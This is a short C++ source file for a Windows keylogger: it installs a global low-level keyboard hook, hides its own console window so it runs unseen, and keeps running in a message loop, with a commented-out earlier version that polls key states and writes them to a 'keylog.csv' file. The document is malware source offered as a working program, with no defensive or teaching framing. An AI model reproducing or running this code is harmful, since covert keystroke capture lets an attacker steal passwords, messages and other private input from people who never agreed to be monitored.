#include <iostream>
#include "keylogger.h";

int main() {
	/*
	FreeConsole();
	unsigned char keyInput;
	while (true)
	{
		Sleep(100);
		// ASCII values 8 - 255
		for (keyInput = 8; keyInput <= 255; keyInput++)
		{
			if (GetAsyncKeyState(keyInput) == -32767)
			{
				keylogger(keyInput, "keylog.csv");
			}
		}
	}
	*/
	// Set up the hook
	HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
	if (!hHook)
	{
		std::cout << "Failed to set up the hook!" << std::endl;
		return 1;
	}

	// Hide the console
	FreeConsole();

	// Message loop (or your desired way to keep the program running)
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0) > 0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	// Unhook before exiting
	UnhookWindowsHookEx(hHook);
	return 0;
}